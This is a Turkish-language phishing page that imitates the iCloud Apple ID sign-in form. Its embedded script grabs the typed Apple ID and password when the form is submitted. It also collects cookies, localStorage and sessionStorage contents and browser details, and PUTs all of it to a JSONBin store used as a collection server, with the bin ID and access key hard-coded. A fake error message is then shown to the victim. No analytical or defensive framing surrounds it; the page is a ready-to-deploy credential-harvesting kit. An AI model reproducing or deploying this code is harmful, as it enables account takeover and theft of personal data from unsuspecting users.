<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud</title>
    <style>
        body, html { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif; background-color: #f5f5f7; color: #1d1d1f; }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-card { background: #ffffff; border-radius: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 48px; width: 100%; max-width: 400px; text-align: center; }
        .icloud-logo { font-size: 48px; margin-bottom: 32px; font-weight: 300; }
        h2 { font-size: 28px; font-weight: 600; margin-bottom: 8px; }
        .subtitle { font-size: 17px; color: #86868b; margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 17px; margin-bottom: 8px; font-weight: 600; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; transition: border-color 0.2s; }
        input:focus { outline: none; border-color: #007aff; box-shadow: 0 0 0 3px rgba(0,122,255,0.1); }
        .login-button { width: 100%; background-color: #007aff; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background-color 0.2s; }
        .login-button:hover { background-color: #005ecb; }
        .error-message { color: #ff3b30; font-size: 14px; margin-top: 16px; display: none; }
        .footer-links { margin-top: 32px; font-size: 14px; }
        .footer-links a { color: #007aff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="icloud-logo">☁️</div>
            <h2>iCloud'a Giriş Yap</h2>
            <p class="subtitle">Apple ID'nizi kullanarak devam edin.</p>
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Apple ID</label>
                    <input type="text" id="username" placeholder="ornek@icloud.com" required>
                </div>
                <div class="form-group">
                    <label for="password">Parola</label>
                    <input type="password" id="password" placeholder="Parolanızı girin" required>
                </div>
                <button type="submit" class="login-button">Giriş Yap</button>
                <div class="error-message" id="errorMessage">Apple ID veya parola yanlış.</div>
            </form>
            <div class="footer-links">
                <a href="#">Apple ID'nizi mi unuttunuz?</a> veya <a href="#">Parola mı unuttunuz?</a>
            </div>
        </div>
    </div>

    <script>
        // !!! ÖNEMLİ: JSONBİN'DEN ALDIĞINIZ BİLGİLER BURADA GİRİLDİ !!!
        const C2_BIN_ID = '6987a50643b1c97be96d3417';
        const C2_API_KEY = '$2a$10$/p/VOYqLF/6pttyDqPhp1OzjVYSGGe48yGwuILYUeCaN3IwkYC9Ou';

        // JSONBin'e veri gönderen yardımcı fonksiyon
        async function exfiltrate(type, data) {
            const victimInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };

            const payload = {
                type: type,
                victimInfo: victimInfo,
                data: data
            };

            try {
                // Önce mevcut verileri oku
                const readResponse = await fetch(`https://api.jsonbin.io/v3/b/${C2_BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': C2_API_KEY }
                });
                const binData = await readResponse.json();
                const currentRecords = binData.record.data || [];

                // Yeni veriyi ekle
                currentRecords.push(payload);

                // Güncellenmiş listeyi geri yaz
                await fetch(`https://api.jsonbin.io/v3/b/${C2_BIN_ID}`, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': C2_API_KEY
                    },
                    body: JSON.stringify({ data: currentRecords })
                });
                console.log(`${type} verisi başarıyla exfiltrate edildi.`);
            } catch (error) {
                console.error('Exfiltration hatası:', error);
            }
        }

        // --- VERİ ÇALMA FONKSİYONLARI ---

        // 1. Çerezleri (Cookies) Çal
        function stealCookies() {
            const cookies = document.cookie.split(';').map(c => c.trim());
            exfiltrate('cookies', cookies);
        }

        // 2. Açık Sekmeleri ve URL'leri Listele (Tarayıcı API'leri ile)
        async function stealTabs() {
            // Not: Bu, bir tarayıcı eklentisi olmadan doğrudan mümkün değildir.
            // Ancak, geçmiş ve depolama alanı gibi diğer bilgiler alınabilir.
            const tabs = "Bu bilgi tarayıcı eklentisi gerektirir. Ancak geçmiş okunabilir.";
            exfiltrate('tabs_info', { message: tabs });
        }

        // 3. Geçmişi (History) Okuma
        async function stealHistory() {
            // Not: Modern tarayıcılar güvenlik nedeniyle geçmişe erişimi engeller.
            // Bu kod, konsept olarak buradadır.
            const historyLength = history.length;
            exfiltrate('history_length', { length: historyLength });
        }

        // 4. Depolama Alanlarını (LocalStorage/SessionStorage) Çal
        function stealStorage() {
            const localStorageData = { ...localStorage };
            const sessionStorageData = { ...sessionStorage };
            exfiltrate('storage', { localStorage: localStorageData, sessionStorage: sessionStorageData });
        }
        
        // Ana form gönderildiğinde tüm operasyonları başlat
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Sayfanın yenilenmesini engelle

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Önce manuel girilen bilgileri gönder
            exfiltrate('manual_login', { username: username, password: password });

            // Ardından diğer tüm veri çalma fonksiyonlarını asenkron olarak çalıştır
            stealCookies();
            stealTabs();
            stealHistory();
            stealStorage();

            // Kullanıcıyı bekletmek ve ikna etmek için sahte bir yükleme animasyonu veya hata mesajı göster
            document.getElementById('errorMessage').style.display = 'block';
            document.querySelector('.login-button').textContent = 'Giriş Yapılıyor...';
            document.querySelector('.login-button').disabled = true;

            // Kısa bir süre sonra kullanıcıyı gerçek bir sayfaya yönlendir (isteğe bağlı)
            setTimeout(() => {
                // window.location.href = 'https://www.apple.com'; // İsterseniz burayı aktif edebilirsiniz
            }, 3000); // 3 saniye bekle
        });
    </script>
</body>
</html>
